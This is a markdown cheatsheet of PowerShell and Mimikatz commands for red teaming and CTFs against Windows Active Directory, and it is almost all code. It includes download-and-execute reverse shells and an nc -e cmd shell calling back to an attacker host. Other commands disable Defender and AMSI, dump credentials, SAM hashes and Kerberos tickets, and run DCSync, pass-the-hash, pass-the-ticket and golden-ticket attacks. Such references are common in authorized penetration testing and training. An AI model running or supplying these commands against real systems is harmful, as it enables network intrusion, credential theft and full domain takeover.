# Cheatsheet for Red Teaming/CTFs
## Quick Enumeration
```powershell
#Perform portscan on hosts
Invoke-Portscan -Hosts "192.168.1.10" -TopPorts 50

#Basic User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount

#Find users with sidHistory set
Get-NetUser -LDAPFilter '(sidHistory=*)' 

#ASREPRoastable users
Get-NetUser -PreauthNotRequired 

#Kerberoastable users
Get-NetUser -SPN 

#Basic Computer info
Get-NetComputer | select samaccountname, operatingsystem, description

#Find computers with Unconstrained Delegation
Get-NetComputer -Unconstrained | select samaccountname 

#Find computers with Constrined Delegation
Get-NetComputer -TrustedToAuth | select samaccountname 

#Get forest trusts
Get-NetForestTrust 

#Get users with privileges in other domains inside the forest
Get-DomainForeignUser 

#Get groups with privileges in other domains inside the forest
Get-DomainForeignGroupMember 
```

## Initial Access & Privilege Escalation
```powershell
#Powershell Reverse shell
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10:8080/tools/ps/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.10 -Port 4444

#Download nc binary.
Invoke-WebRequest "http://192.168.1.10:8080/tools/bin/nc64.exe" -OutFile "C:\Windows\Temp\nc64.exe"

#Download PowerUp and check for privilege escalation vectors
IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/PowerUp.ps1');Invoke-AllChecks

#Download and save file to compromised machine
Invoke-WebRequest "http://192.168.1.10:8080/tools/ps/SomeBS.ps1" -OutFile "C:\Windows\Temp\SomeBS.ps1"

#Full path of 64 bit powershell binary to get a 64 bit reverseshell
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -C "C:\Windows\Temp\nc.exe -e cmd 192.168.1.10 4444"
```

## Post Exploitation
```powershell
#Disable AV and AMSI
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true

#Download and run Bloodhound ingestor on machine
IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod All

#Download and run Mimikatz dumpcreds
IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds

#Dump SAM hashes using mimikatz
Invoke-Mimikatz -Command '"privilege:debug" "token::elevate" "lsadump::sam" "exit"'

#Perform a DCSync attack and dump all hashes in the Domain using mimikatz
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /all /csv"'

#Dump all tickets using mimiktaz
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"'

#Pass the dumped ticket using mimikatz
Invoke-Command -Session $sess -ScriptBlock { Invoke-Mimikatz -Command '"privilege::debug" "kerberos::ptt ticket.kirbi" "exit"' }

#Execute command as user using the dumped hash
Invoke-SMBExec -Target MS01 -Domain EVILCORP -Username elliot -Hash 31d6cfe0d16ae931b73c59d7e0c089c0 -Command "net localgroup administrators evil\elliot /add"

#Create a Nested PS Session and disable AV
$sess = New-PSSession -ComputerName MS01 -Credential evil\elliot
Invoke-Command -Session $sess -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true }

#Reset password of AD Account
Set-ADAccountPassword -Identity administrator -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password1" -Force)

#Pass the Hash using mimikatz
sekurlsa::pth /user:itstaff /domain:evilcorp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0

#Child domain to Parent domain lateral movement 
kerberos::golden /domain:evilcorp.local /sid:S-1-5-21-3965405831-1015596948-2589850225 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /user:Administrator /sids:S-1-5-21-493355955-4215530352-779396340-519 /ptt

#Create a Golden Ticket using krbtgt hash
kerberos::golden /domain:evilcorp.local /sid:S-1-5-21-258778211-3859232159-551458613 /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /user:Administrator /ptt
misc::cmd
```
